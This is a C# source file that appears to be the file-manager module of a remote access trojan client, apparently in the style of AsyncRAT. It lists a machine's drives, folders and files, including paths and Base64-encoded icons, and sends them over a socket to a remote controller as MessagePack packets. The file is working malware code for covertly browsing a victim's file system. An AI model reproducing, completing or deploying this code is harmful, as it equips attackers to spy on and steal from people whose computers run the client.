using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace Client.Handle_Packet
{
    class FileManager
    {

        public void GetDrivers()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "getDrivers";
            StringBuilder sbDriver = new StringBuilder();
            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady)
                {
                    sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                }
                msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                ClientSocket.BeginSend(msgpack.Encode2Bytes());
            }
        }

        public void GetPath(string path)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "getPath";
            StringBuilder sbFolder = new StringBuilder();
            StringBuilder sbFile = new StringBuilder();

            foreach (string folder in Directory.GetDirectories(path))
            {
                sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
            }
            foreach (string file in Directory.GetFiles(path))
            {
                Icon icon = Icon.ExtractAssociatedIcon(file);
                Bitmap bmpIcon = icon.ToBitmap();
                using (MemoryStream ms = new MemoryStream())
                {
                    bmpIcon.Save(ms, ImageFormat.Png);
                    sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                }
            }
            msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
            msgpack.ForcePathObject("File").AsString = sbFile.ToString();
            ClientSocket.BeginSend(msgpack.Encode2Bytes());

        }


    }
}
